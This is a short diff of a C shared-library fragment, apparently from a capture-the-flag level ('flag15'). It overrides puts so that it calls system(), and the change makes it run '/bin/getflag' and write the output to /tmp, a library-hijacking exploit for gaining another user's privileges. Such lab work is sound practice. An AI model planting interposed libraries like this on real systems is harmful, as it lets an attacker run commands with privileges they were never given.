@@ -7,7 +7,7 @@ void __cxa_finalize(void * d) {
 }
 
 int puts(const char *s) {
-	system("/bin/cat /home/flag15/hall_of_fame");
+	system("/bin/getflag > /tmp/out15");
 	
 	return 0;
 }
